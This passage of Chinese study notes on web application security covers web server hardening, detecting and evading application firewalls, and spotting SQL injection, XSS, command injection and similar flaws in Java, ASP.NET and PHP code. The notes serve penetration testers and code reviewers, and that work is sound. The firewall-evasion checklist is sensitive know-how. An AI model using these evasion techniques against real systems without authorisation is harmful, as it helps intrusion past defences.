<li>避开 Oracle PL/SQL 的过滤列表：虽然 Oracle 使用了过滤名单，但是攻击者通过将恶意指令进行编码，避开过滤清单的匹配，同时编码后的指令仍然可以由后端数据库进行解码并正确执行；这种漏洞普通存在，根本原因在于前端检查基于字符串匹配，但是后端却接受各种奇怪怪的编码形式，防不胜防，详见：<a target="_blank" rel="noopener" href="http://www.securityfocus.com/archive/1/423819/100/0/threaded">http://www.securityfocus.com/archive/1/423819/100/0/threaded</a></li>
</ul>
<h3 id="查找-Web-服务器漏洞"><a href="#查找-Web-服务器漏洞" class="headerlink" title="查找 Web 服务器漏洞"></a>查找 Web 服务器漏洞</h3><p>本章描述的各种漏洞由于时间悠久，因此这些版本的新版本可能都已经修复了以上漏洞，但重要的是背后的思路和本质。一般可以先从使用自动化扫描工具开始，对服务器程序进行测试，例如 Nessus；</p>
<p>另外还可以从以下站点查找最新的漏洞消息：</p>
<ul>
<li>Security Focus</li>
<li>OSVDB</li>
<li>Bugtraq 和 Full 邮件列表</li>
</ul>
<p>当发现一些新漏洞后，再看一下 Exploit Database 和 Metasploit，看是否有人已经开始探查该漏洞；</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.exploit-db.com/">www.exploit-db.com</a></li>
<li><a target="_blank" rel="noopener" href="http://www.metasploit.com/">www.metasploit.com</a></li>
<li><a target="_blank" rel="noopener" href="http://www.grok.org.ukfull-disclosure/">www.grok.org.ukfull-disclosure</a></li>
<li><a target="_blank" rel="noopener" href="http://osvdb.org/search/advsearch">http://osvdb.org/search/advsearch</a></li>
</ul>
<blockquote>
<p> 如有可能，应该在本地安装目标软件进行测试，查找已知的广泛流传的漏洞，或者其他尚未发现的漏洞；</p>
</blockquote>
<h3 id="保障-Web-服务器软件的安全"><a href="#保障-Web-服务器软件的安全" class="headerlink" title="保障 Web 服务器软件的安全"></a>保障 Web 服务器软件的安全</h3><p>由于 Web 服务器软件通常是由第三方进行开发的，因此本质上来讲，客观存在一定程度的不可控因素。但是开发人员仍然可以采取一些有效的预防措施，降低风险的概率，包括如下：</p>
<h4 id="选择记录良好的软件"><a href="#选择记录良好的软件" class="headerlink" title="选择记录良好的软件"></a>选择记录良好的软件</h4><p>记录良好的标志包括：</p>
<ul>
<li>存在严重漏洞的数量；</li>
<li>供应商是否及时修复这些漏洞并发布补丁；</li>
</ul>
<h4 id="应用供应商发布的补丁"><a href="#应用供应商发布的补丁" class="headerlink" title="应用供应商发布的补丁"></a>应用供应商发布的补丁</h4><p> 有责任的供应商都会定期发布补丁，有时候问题是供应商内部自己发现的，有时候是由外部人员告知的。当补丁发布后，通过逆向工程很快就可以查找该补丁所要解决的问题所在，之后黑客便可以根据补丁所要修复的问题，对那些还未进行更新的应用程序发起攻击；</p>
<h4 id="实施安全强化"><a href="#实施安全强化" class="headerlink" title="实施安全强化"></a>实施安全强化</h4><p>开发人员除了认真查看 Web 服务器软件中的强化指南外，还需要采取以下强化措施：</p>
<ul>
<li>禁用一切不必要的功能。余下功能则应尽可能配置成严格执行的模式，可使用 IIS Lockdown 等工具来完成这个工作；</li>
<li>如有编译型语言编写的组件，则考虑是否改由解释型语言编写；如果不能，则应使用解释型语言的代码，对用户的输入进行检查过滤，确保安全后，再转发给编译型的组件；</li>
<li>对开启的功能进行重命名，这种模糊处理虽然不能从根本上解决问题，但可以防御一些自动化工具和一些新手；</li>
<li>实施最低权限原则，例如使用最低权限的操作系统账户，在 UNIX 环境中使用 chroot 环境以限制攻击的范围；</li>
</ul>
<h4 id="监控新的漏洞"><a href="#监控新的漏洞" class="headerlink" title="监控新的漏洞"></a>监控新的漏洞</h4><p>安排专职人员监控 Bugtraq 和 Full Disclosure 等网站，第一时间了解漏洞消息，并有效的进行改进；</p>
<h4 id="使用多层防御"><a href="#使用多层防御" class="headerlink" title="使用多层防御"></a>使用多层防御</h4><p>实施多层的保护，以便万一 Web 服务器被攻破了，也能够最大程度的减少损失；常见措施包括：</p>
<ul>
<li>限制 Web 服务器对其他应用程序组件的访问权限，例如只允许服务器账户使用数据库的 INSERT 功能，这样可以避免攻击者删除日志记录；</li>
<li>对进出 Web 服务器的流量实施严格的网络过滤；</li>
<li>使用入侵检测系统，以第一时间发现入侵行为；攻击者在攻破 Web 服务器后，一般会尝试建立反向连接，或者扫描DMZ 网络中的其他主机；入侵检测系统可以第一时间探查这些行为，并发出警报；</li>
</ul>
<h2 id="Web-应用程序防火墙"><a href="#Web-应用程序防火墙" class="headerlink" title="Web 应用程序防火墙"></a>Web 应用程序防火墙</h2><p>大多数应用程序都受到某种外部组件的保护，这些组件通常安装在相同主机上面，或者网络设备上面，提供入侵防御或入侵检测的功能。但实际上，它们能够发挥的效果非常的有限，但却给人们造成了更加安全的错觉，从而可能放松了警惕；这类组件的原理基本类似，它们都是基于特定的常见攻击荷载，而不是基于利用漏洞的常规方法</p>
<p>渗透测试步骤：</p>
<p>可以使用以下方法推断是否安装了 Web 应用程序防火墙</p>
<ul>
<li>选择应用程序某个会在响应中返回所请求的参数值的 URL，提供一个随机的参数名，并在参数值中包含有效的攻击荷载；如果应用程序阻止了攻击请求，则说明很可能有外部防御组件；</li>
<li>如果某个请求参数值会在响应中返回，则修改该参数值，提交一系列模糊测试字符串，以及这些字符串的编码形式，观察响应结果，与原始请求参数进行比对，了解应用程序对请求参数的过滤检查机制；</li>
<li>针对参数的过滤检查机制，设计有效的攻击荷载，再次发起请求，确认是否存在入侵检测行为；</li>
</ul>
<p>通过提交以下字符串，尝试避开应用程序的防火墙：</p>
<ul>
<li>根据 IDP 入侵检测程序的工作原理，可以相应的设计出不会被其关键字库匹配到的字符串，作为攻击荷载，例如避免在 XSS 攻击中出现 &lt;script&gt; 字样或者 alert、xss 等字样；</li>
<li>如果特定的请求被阻止，则可以尝试在请求中的不同位置放入相同的参数，例如 GET 请求的 URL，POST 请求的消息体、POST 请求的 URL、cookie、页面隐藏参数等（详见第 4 章）；</li>
<li>找到接受非标准格式（如序列化和编码）参数的位置，提交攻击荷载；</li>
<li>将攻击荷载分布到多个参数中进行提交；</li>
<li>使用字符串串联功能来提交（例如 ASP.NET 的 HPP 功能）；</li>
</ul>
<h1 id="19-查找源代码中的漏洞"><a href="#19-查找源代码中的漏洞" class="headerlink" title="19. 查找源代码中的漏洞"></a>19. 查找源代码中的漏洞</h1><p>如果有机会源代码的话，那么只要掌握一些常用的技巧，即使不是专业的编程人员，也能够从源代码中发现很多潜在漏洞；</p>
<h2 id="代码审查方法"><a href="#代码审查方法" class="headerlink" title="代码审查方法"></a>代码审查方法</h2><h3 id="黑盒测试与白盒测试"><a href="#黑盒测试与白盒测试" class="headerlink" title="黑盒测试与白盒测试"></a>黑盒测试与白盒测试</h3><p>黑盒和白盒各有其优缺点，由于黑盒可以使用自动化的攻击工具，因此在大多数情况下，其发现漏洞的效率比较高，毕竟阅读源代码本身需要花费很多时间。但有少数漏洞则是阅读源代码就能直接发现漏洞，黑盒反而需要很长时间，例如一个通用的后门密码会明文的写在源代码中，但是通过黑盒测试很难发现它；</p>
<p>最好的方式是二者相互补充，在阅读源码的过程中，如果发现了潜在漏洞，就使用黑盒进行自动化的测试，看漏洞是否能够触发；</p>
<h3 id="代码审查方法-1"><a href="#代码审查方法-1" class="headerlink" title="代码审查方法"></a>代码审查方法</h3><p>对于功能复杂的应用程序，源代码通常有成千上万行，从头到尾逐一阅读并不是最好的办法，可以使用结构化的技巧，来提高漏洞查找效率：</p>
<ul>
<li>从数据进入点开始追踪整个处理的流程，审查负责处理这些数据的代码（不同的 Web 开发语言，其处理框架不同、常见配置不同，可事先阅读文档进行了解）；</li>
<li>在代码中搜索隐含常见漏洞的代码关键字，审查包含关键字的代码，确定是否存在漏洞；</li>
<li>对包含敏感功能的代码进行审查，理解其逻辑，审查是否存在安全问题。这些敏感功能包括：身份验证功能、会话管理、访问控制、输入确认、外部组件接口、动态库调用；</li>
</ul>
<blockquote>
<p>应用程序很可能对第三方库和 API 进行定制化的封装或扩展，在审查之前，可预先了解封装的内容；</p>
</blockquote>
<h2 id="常见漏洞特征"><a href="#常见漏洞特征" class="headerlink" title="常见漏洞特征"></a>常见漏洞特征</h2><p>漏洞的关键特征并不区分语言，虽然各种语言的语法不同，但是相同的漏洞，仍然在不同的语言中，呈现相同的特征</p>
<h3 id="跨站点脚本"><a href="#跨站点脚本" class="headerlink" title="跨站点脚本"></a>跨站点脚本</h3><p>在典型的 XSS 漏洞中，代码会从用户的请求参数中，提取参数值，生成 HTML 页面内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210425090250.png" srcset="/img/loading.gif" lazyload></p>
<p>以及从请求参数中提取内容，作为响应中的变量值：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426085159.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>此处的漏洞微妙，即仅当 requestType的值为 3 的时候，漏洞才有可能被触发，这种漏洞在黑盒测试中不容易发现，除非使用对每一个参数都进行单独的测试；</p>
</blockquote>
<h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>SQL 漏洞的典型特征是提取用户的输入，然后和各种硬编码的字符串组成 SQL 查询指令；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426085547.png" srcset="/img/loading.gif" lazyload></p>
<p>只需要在代码中搜索 SQL 指令的关键字片断，就很容易很到这一类硬编码的字符串；</p>
<blockquote>
<p>注意：SQL 指令不区分大小写，因此搜索的时候，应该启用大小写不敏感的功能；</p>
</blockquote>
<h3 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h3><p>调用操作系统 API 的位置，最有可能出现路径遍历漏洞， 此时代码常常将用户输入值附加在某个目录名称后面，组成完整的路径；此类漏洞常常出现于允许用户上传和下载文件的功能中；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426090057.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="任意重定向"><a href="#任意重定向" class="headerlink" title="任意重定向"></a>任意重定向</h3><p>重定向漏洞的特征在于从用户提交的输入中提取内容用来组成 URL 值；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426090625.png" srcset="/img/loading.gif" lazyload></p>
<p>除了服务端外，客户端的 JS 代码也可能存在重定向漏洞，因此客户端 JS 代码也会提取用户的输入生成 URL；由于 JS 代码是明文的，任意用户都可以查看，因此攻击者无须权限，就可以核查里面的内容，是否包含可利用的漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426091222.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>在对参数值进行检查确认之后，再次解码就会引入漏洞，因为攻击者可以先将攻击荷载进行双重编码，第一次解码后，可通过检查；等到第二次解码时，再让攻击荷载真正生效起来；例如设计成这样：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426091427.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<h3 id="OS-命令注入"><a href="#OS-命令注入" class="headerlink" title="OS 命令注入"></a>OS 命令注入</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427081806.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>通常各种语言都有内置调用操作系统命令的方法，搜索这些方法的关键字即可，例如此处的 system；</p>
</blockquote>
<h3 id="后门密码"><a href="#后门密码" class="headerlink" title="后门密码"></a>后门密码</h3><p>为了调试方便，一般开发者会将后门密码写在身份验证的函数中，非常容易确认；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427082026.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="可执行文件漏洞"><a href="#可执行文件漏洞" class="headerlink" title="可执行文件漏洞"></a>可执行文件漏洞</h3><p>应对可执行文件的源代码进行审查，确保里面没有包含一些常见的漏洞，例如：</p>
<h4 id="缓冲区溢出漏洞-1"><a href="#缓冲区溢出漏洞-1" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h4><p>当创建某个内存缓冲区后，接下来会调用 API 往缓冲区中写入数据，漏洞发生在写入的环节。有多个内置函数可以实现对缓冲区的写入，重点应该注意这些写入的内容，是否由用户控制，以及写入之前，是否对长度进行检查。通过在源代码中搜索每一个调用缓冲写入函数的位置，即可以排查漏洞；</p>
<blockquote>
<p>常见的缓冲区写入函数有：strcpy、memcpy、sprintf 及它们的各种变体；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427084503.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="整数漏洞-1"><a href="#整数漏洞-1" class="headerlink" title="整数漏洞"></a>整数漏洞</h4><p>整数漏洞总体来说比较隐蔽，不仔细思考一眼不一定看得出来。但有些情况比较明显，例如有符号整数和无符号整数的比较时（原因：隐式转换）；例如 len 和 sizeof 的比较；</p>
<h4 id="格式化字符串漏洞-1"><a href="#格式化字符串漏洞-1" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h4><p>通过搜索 printf 和 FormatMessage 系列函数的位置，如果参数由用户控制，则很可能存在漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085119.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="源代码注释"><a href="#源代码注释" class="headerlink" title="源代码注释"></a>源代码注释</h3><p>当开发者觉得某段代码存在隐患，为避免遗忘，一般会在注释中写下说明，以便后续能够快速想起。但由于各种不可控的原因，这些隐患经常没有在第一时间得到排除，导致它们一直存在。通过在注释中搜索一些常见的关键字，可用来发现这类问题，常见关键字有：bug, problem, bad, hope, todo, fix, overflow, crash, inject, xss, trust, error 等；</p>
<h2 id="Java-平台"><a href="#Java-平台" class="headerlink" title="Java 平台"></a>Java 平台</h2><h3 id="获取用户提交的数据"><a href="#获取用户提交的数据" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p>Java Web 程序一般通过 javax.servlet.ServletRequest 以及它的扩展 javax.servlet.http.HttpServletRequest 两个接口来获取用户提交的请求数据，这两个对象包含大量的方法，可用来提取请求对象中的内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085806.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="会话交互"><a href="#会话交互" class="headerlink" title="会话交互"></a>会话交互</h3><p>Java Web 程序一般通过 javax.servlet.http.HttpSession 接口来管理用户的会话，该接口常用方法如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085951.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="潜在的危险-API"><a href="#潜在的危险-API" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h4><p>Java 一般使用 java.io.File 类来访问文件或目录，它的构造函数接收路径或者目录+文件名做为参数进行实例化，如果在构造函数中没有检查点和斜线，并且参数由用户控制，则可能存在路径遍历漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090537.png" srcset="/img/loading.gif" lazyload></p>
<p>关于文件内容的读写，Java 常用类如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090659.png" srcset="/img/loading.gif" lazyload></p>
<p>它们同样存在和 java.io.File 相同的问题</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090748.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="数据库访问"><a href="#数据库访问" class="headerlink" title="数据库访问"></a>数据库访问</h4><p>以下几个用于查询数据库的 API 容易受到 SQL 注入攻击，因为它们的查询参数直接由拼接字符串的方式实现；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073357.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073409.png" srcset="/img/loading.gif" lazyload></p>
<p>另外一种更加安全的做法，是避免拼接字符串，而是以替换指定位置的字符串来实现（通过 prepareStatement），包括如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073528.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="OS-命令执行"><a href="#OS-命令执行" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><p>Java 调用系统命令的 API 如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073905.png" srcset="/img/loading.gif" lazyload></p>
<p>如果传递给这些 API 的参数能够被用户控制，则存在命令注入漏洞。但如果用户只能控制部分字符串，例如只能指定命令参数，而不能指定命令名称，那么出现漏洞的概率就比较小；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074051.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074033.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074218.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>Java 发送重定向响应的相关 API 如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074436.png" srcset="/img/loading.gif" lazyload></p>
<p>  攻击者除了通过 sendRedirect 来实现重定向外，还可以使用 setStatus 为 3XX，同时通过 addHeader 添加 Location 字段，来实现重定向；</p>
<h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><p>Java 使用 java.net.Socket 类来创建 socket 连接，如果用户能够控制传递给  socket 类的参数，则可能存在漏洞，因为攻击者可以利用该 socket 连接，访问其他主机；</p>
<h3 id="配置-Java-环境"><a href="#配置-Java-环境" class="headerlink" title="配置 Java 环境"></a>配置 Java 环境</h3><p>Java web 环境配置参数一般放在 web.xml 文件中，内容一般包括登录验证方式，资源访问控制等；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428075230.png" srcset="/img/loading.gif" lazyload></p>
<p>除了 web.xml 文件外，还有部分相关配置参数放在应用程序服务器的配置文件中，例如 weblogic.xml 文件等，应同时检查这些配置文件，查看是否存在漏洞；</p>
<h2 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET"></a>ASP.NET</h2><h3 id="获取用户提交的数据-1"><a href="#获取用户提交的数据-1" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p>System.Web.HttpRequest  类</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081146.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="会话交互-1"><a href="#会话交互-1" class="headerlink" title="会话交互"></a>会话交互</h3><p>Session 类：保留跟当前会话相关的用户信息；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081352.png" srcset="/img/loading.gif" lazyload></p>
<p>Profile 类：用于保存用户的个性化设置，因此它是持久性的，跟当前会话无关；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081535.png" srcset="/img/loading.gif" lazyload></p>
<p>System.Web.SessionState.HttpSessionState 类：也可以用来保存会话信息，相关的方法如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081653.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="潜在的危险-API-1"><a href="#潜在的危险-API-1" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问-1"><a href="#文件访问-1" class="headerlink" title="文件访问"></a>文件访问</h4><p>System.IO.File 类：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081829.png" srcset="/img/loading.gif" lazyload></p>
<p>读取和写入的类：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081851.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="数据库访问-1"><a href="#数据库访问-1" class="headerlink" title="数据库访问"></a>数据库访问</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081914.png" srcset="/img/loading.gif" lazyload></p>
<p>同 Java 一样，如果直接拼接查询字符串会存在漏洞隐患，更安全的做法是通过 Parameters 属性来创建使用参数占位符的查询语句；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428082229.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="动态代码"><a href="#动态代码" class="headerlink" title="动态代码"></a>动态代码</h4><p>ASP 通过 VBScript 可以接受动态代码，相关几个函数包括：</p>
<ul>
<li>Eval 函数：接受 VBScript 代码字符串； </li>
<li>Execute 函数：接受 ASP 代码字符串；</li>
<li>ExecuteGlobal 函数：接受 ASP 代码字符串；</li>
</ul>
<h4 id="OS-命令执行-1"><a href="#OS-命令执行-1" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428082826.png" srcset="/img/loading.gif" lazyload></p>
<p>如果可以直接向 Start 传递字符串参数，或者通过 StartInfo 传递参数，则存在漏洞隐患。</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083130.png" srcset="/img/loading.gif" lazyload></p>
<p>即使仅能控制部分字符串，也有隐患：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083157.png" srcset="/img/loading.gif" lazyload></p>
<p>另外通过 ProcessStartInfo 的 Arguments 属性，如果用户可以控制 Arguments 的参数，则虽然攻击者不能执行指定代码，但可以通过指定参数，影响命令的期望行为，例如下载恶意文件到主机的任意位置；</p>
<h4 id="重定向-1"><a href="#重定向-1" class="headerlink" title="重定向"></a>重定向</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083436.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="套接字-1"><a href="#套接字-1" class="headerlink" title="套接字"></a>套接字</h4><p>System.Net.Sockets.Socket 类，漏洞利用方法跟 Java 平台一样；</p>
<h3 id="ASP-NET-环境配置"><a href="#ASP-NET-环境配置" class="headerlink" title="ASP.NET 环境配置"></a>ASP.NET 环境配置</h3><p>环境配置参数放在 Web 根目录下的 web.config 文件中</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428084414.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="获取用户提交的数据-2"><a href="#获取用户提交的数据-2" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p>PHP 使用一些内置变量来保存用户的请求数据</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428085113.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428085129.png" srcset="/img/loading.gif" lazyload></p>
<p>在处理用户的输入时，PHP 有一些特殊的用法：</p>
<ul>
<li>$GLOBALS 对象用来访问预先定义的全局变量；</li>
<li>如果配置项 register_globals 开启，则 PHP 会为每个请求参数建立全局变量，访问程序中的代码在各处实现访问请求参数，而无须传递这些请求参数；这会给代码审查增加一些额外的工作，因为对请求参数的引用，变得更加隐蔽了；</li>
<li>$_SERVER 数据中可以访问用户提交的定制消息头；</li>
<li>如果请求参数中的某个参数名称包含索引引用，则该参数的值将被自动转换成对象类型；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428090257.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h3 id="会话交互-2"><a href="#会话交互-2" class="headerlink" title="会话交互"></a>会话交互</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428090402.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="潜在的危险-API-2"><a href="#潜在的危险-API-2" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问-2"><a href="#文件访问-2" class="headerlink" title="文件访问"></a>文件访问</h4><p>PHP 中读写文件的函数有很多个，其中一些还可以访问远程文件；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073634.png" srcset="/img/loading.gif" lazyload> <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073652.png" srcset="/img/loading.gif" lazyload>   <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073720.png" srcset="/img/loading.gif" lazyload> </p>
<p>如果直接向上面这些函数传递拼接后的字符串，则将存在漏洞隐患；</p>
<p>另外还有一些函数用于执行 PHP 脚本，如果用户可以控制传递给它们的参数，则也非常危险；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073846.png" srcset="/img/loading.gif" lazyload></p>
<p>访问远程文件的功能默认是打开的，可通过配置参数 allow_url_fopen  将其关闭；但是关闭后，仍然有几个方法可用于访问远程文件，PHP 在 5.2 以上版本引入了 allow_url_include 参数并默认将其关闭来避免上述漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074224.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="数据库访问-2"><a href="#数据库访问-2" class="headerlink" title="数据库访问"></a>数据库访问</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074253.png" srcset="/img/loading.gif" lazyload></p>
<p>以上函数直接接受字符串查询参数，易于受到攻击。下面几个函数则使用占位符的方式插入查询参数，相对安全；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074352.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="动态代码-1"><a href="#动态代码-1" class="headerlink" title="动态代码"></a>动态代码</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074800.png" srcset="/img/loading.gif" lazyload></p>
<p>动态代码的多个语句使用分号进行分隔，如果用户可控制参数，则易于受到脚本注入攻击；</p>
<p>另外搜索替换功能的正则表达式函数 preg_replace，如果以 /e 选项调用，则会执行 PHP 代码；若用户可控制参数，则存在漏洞隐患；</p>
<p>PHP 还接受函数名称做为变量，然后动态调用该函数；因此攻击者可以通过指定相应的参数名称，让 PHP 调用某些内置的敏感函数，如 phpinfo，获取与 PHP 运行时环境相关的信息；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429075147.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="OS-命令执行-2"><a href="#OS-命令执行-2" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429082649.png" srcset="/img/loading.gif" lazyload></p>
<p>跟 JAVA, ASP 不同，PHP 的系统命令接口，接受 | 字符用来对多个命令进行连接，因此它非常危险；如果未对用户的输入进行过滤，意味着攻击者有机会执行任意的系统命令；</p>
<h4 id="重定向-2"><a href="#重定向-2" class="headerlink" title="重定向"></a>重定向</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429082838.png" srcset="/img/loading.gif" lazyload></p>
<p>实现重定向有两种方法，一种直接使用  http_redirect API，另外一种是通过 setResponseCode 和 setHeaders；</p>
<h4 id="套接字-2"><a href="#套接字-2" class="headerlink" title="套接字"></a>套接字</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429083021.png" srcset="/img/loading.gif" lazyload></p>
<p>通过 socket_create 函数可与任意的主机建立连接，无论是公共的因特网，还是私有网络上的任意主机；fsockopen 和 pfsockopen 函数在建立连接后，可返回一个标准文件指针，供 fwrite 和 fgets 等函数调用，从而实现两个主机之间的数据传输；</p>
<h3 id="配置-PHP-环境"><a href="#配置-PHP-环境" class="headerlink" title="配置 PHP 环境"></a>配置 PHP 环境</h3><p>PHP 配置参数放在 php.ini 文件中，它的内容结构和 windows ini 文件类似，里面有很多不安全的选项（新版本的 PHP 删除掉了很多问题选项）；</p>
<h4 id="使用全局变量"><a href="#使用全局变量" class="headerlink" title="使用全局变量"></a>使用全局变量</h4><p>如果 redister_globals 选项被开启，则 PHP 会为每个请求参数建立全局变量；如果变量在使用前没有预先初始化一个值，那么攻击者就可以将某个变量设置为任意值，从而存在应用程序的逻辑；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429083712.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>PHP 4.2 以上版本将 register_globals 设置为默认关闭了，并在 PHP 6  以下版本完全去除了该选项；</p>
</blockquote>
<h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><p>如果开启 safe_mode 模式，则某些危险的函数将被禁用，某些敏感函数的功能会受到一定的使用限制；例如：</p>
<ul>
<li>shell_exec 函数被禁用，原因：该函数可用于调用任意的操作系统命令；</li>
<li>mail 函数的 additional_parameters 参数被禁用，原因：该参数存在 SMTP 注入漏洞；</li>
<li>exec 函数仅限于执行 safe_mode_exec_dir 中指定的可执行程序，并且将转义命令行中的元字符；</li>
</ul>
<blockquote>
<p>虽然 safe_mode 限制了部分危险函数，但是由于它不可能限制所有的函数，因此攻击者仍然有机会通过其他函数曲线救国，实施攻击。因此在 PHP 6 以上的版本，安全模式已经被删除了；</p>
</blockquote>
<h4 id="magic-quotes"><a href="#magic-quotes" class="headerlink" title="magic quotes"></a>magic quotes</h4><p>当 magic quotes 选项被激活时，PHP 将转义请求参数中的任何单引号、双引号、反斜线和空格（即为它们添加一个反斜线）。该选项的目的是防范 SQL  注入攻击；</p>
<p>但事实上，这个功能的效果很有限，因为攻击者可以使用二阶攻击的方式来避开转义，另外在 SQL 中注入数字字段时，也不需要单引号。</p>
